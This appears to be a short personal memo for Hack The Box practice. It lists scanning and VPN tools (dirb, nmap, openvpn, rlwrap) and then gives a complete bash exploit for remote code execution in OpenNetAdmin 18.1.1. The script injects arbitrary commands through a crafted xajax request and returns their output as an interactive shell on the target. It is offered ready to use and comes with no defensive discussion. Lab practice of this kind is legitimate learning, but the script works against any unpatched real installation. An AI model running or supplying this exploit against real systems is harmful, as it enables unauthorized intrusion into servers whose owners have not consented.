# Hack The Box Setup/Memos

### **_Do most testing in a VM or Linux enviroment to avoid damaging your system and for access to most tool sets being used._**

---

## Useful Tools:

|                             Tool                              |                                            Usage                                            |
| :-----------------------------------------------------------: | :-----------------------------------------------------------------------------------------: |
| [dirb](https://zoomadmin.com/HowToInstall/UbuntuPackage/dirb) |                            Brute force server directory scanner                             |
|     [openvpn](https://www.ovpn.com/en/guides/ubuntu-cli)      | Open source vpn tunneling service. HTB requires this for you to access some target servers. |
|         [rlwrap](https://linux.die.net/man/1/rlwrap)          |     Wraps minimal read-line cmd prompt to enable back and forward code history flipping     |
|        [nmap](https://nmap.org/book/man-examples.html)        |                          Checks for open ports in a given domain.                           |

### Useful script to gain RCE for <mark>**OpenAdmin**</mark>

```bash
#!/bin/bash
Exploit Title: OpenNetAdmin 18.1.1 - Remote Code Execution
# Date: 2019-11-19

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
```
